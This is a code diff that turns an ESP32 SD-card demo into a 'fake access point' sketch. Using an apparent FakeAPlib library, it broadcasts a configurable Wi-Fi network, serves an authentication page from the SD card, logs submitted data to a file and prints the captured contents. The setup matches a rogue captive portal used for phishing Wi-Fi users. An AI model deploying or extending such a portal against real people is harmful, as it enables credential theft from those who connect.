@@ -1,44 +1,60 @@
-#include <SDFiles.h>
+/**
+ * @file fake_access_point.ino
+ * @author NGUEYOU SIMO, Neil L. (you@domain.com)
+ * @brief The pins and functions for reading and writting to a SD are already defined in the SDFiles src files.
+ * Note that this is only meant to be used for a ESP32 board which has an integrated SD reader.
+ * The dependencies of this library are:
+ * - FS.h
+ * - SD_MMC.h
+ *
+ * @version 0.1
+ * @date 2024-12-29
+ *
+ * @copyright Copyright (c) 2024
+ *
+ */
 
-/*
-* The pins and functions for reading and writting to a SD are already defined in the SDFiles src files.
-* Note that this is only meant to be used for a ESP32 board which has an integrated SD reader.
-*
-*
-*
-*
-*/
+#include <FakeAPlib.h>
 
-void setup() {
-  Serial.begin(115200);
-  delay(2000);
+const char *authPage  = "/folder/index.htm";
+const char *thksPage  = "/folder/page.htm";
+const char *dataFile  = "/folder/data.txt";
+const char *ssid	  	= "AP_SSID";
+const char *psw 	  	= "AP_PASS";	// optional
+const char *WIFI_SSID = "STA_SSID"; // optional
+const char *WIFI_PSW  = "STA_PASS";	// optional
 
-  SD_MMC.setPins(SD_MMC_CLK, SD_MMC_CMD, SD_MMC_D0);
+IPAddress apip(192, 168, 1, 1);
+IPAddress serverip(10, 10, 1, 1);
 
-  if (!SD_MMC.begin("/sdcard", true, true, SDMMC_FREQ_DEFAULT, 5))
-  {
-    Serial.println("Card mount failed!!!!!!!!!");
-    return;
-  }
+FakeAP* accessPoint = new FakeAP(80);
 
-  uint8_t cardType = SD_MMC.cardType();
-  if(cardType==CARD_NONE)
-  {
-    Serial.println("No SD_MMC card attached");
-    return;
-  }
+void setup()
+{
+	Serial.begin(115200);
+	delay(2000);
 
-  Serial.printf("Card type: %s\n", getCardType(cardType));
+	Serial.println("Loading....");
+	accessPoint->setPath(authPage, INDEXPAGE);
+	accessPoint->setPath(thksPage, EXITPAGE);
+	accessPoint->setPath(dataFile, DATAFILE);
 
-  uint64_t cardSize = SD_MMC.cardSize() / (1024 * 1024);
-  Serial.printf("SD_MMC Card Size: %lluMB\n", cardSize);
+	WiFi.mode(WIFI_AP_STA);
+	WiFi.softAPConfig(apip, apip, IPAddress(255, 255, 255, 0));
+	WiFi.hostname("ESP_Server");
 
-  listDir(SD_MMC, "/", 0);
- 
-  Serial.printf("Total space: %lluMB\r\n", SD_MMC.totalBytes() / (1024 * 1024));
+	if (!accessPoint->initialize(ssid, psw))
+		Serial.println("Error en la configuración del punto de acceso");
+
+	if (!accessPoint->setWifiStation(WIFI_SSID, WIFI_PSW))
+    	Serial.println("Conexión a la wifi fallada.");
+	
+	Serial.println("Config done!");
 }
 
-void loop() {
-  delay(100000);
-
+void loop()
+{
+	accessPoint->process();
+	Serial.println("Acces point on. Listenning....");
+	accessPoint->printFilesContent();
 }
